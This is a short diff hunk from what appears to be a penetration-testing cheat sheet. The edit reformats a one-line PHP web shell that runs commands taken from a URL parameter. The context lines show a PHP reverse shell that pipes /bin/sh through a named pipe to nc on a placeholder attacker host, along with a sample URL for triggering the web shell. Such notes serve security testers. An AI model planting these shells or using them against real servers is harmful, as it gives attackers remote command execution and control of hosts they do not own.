@@ -509,8 +509,7 @@ $ echo '<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <L
 ```
 
 ```c
-<?php echo(md5(1));@system
-($_GET[0]);?>
+<?php echo(md5(1));@system($_GET[0]);?>
 ```
 
 > http://<RHOST>/<FILE>.php?0=<COMMAND>
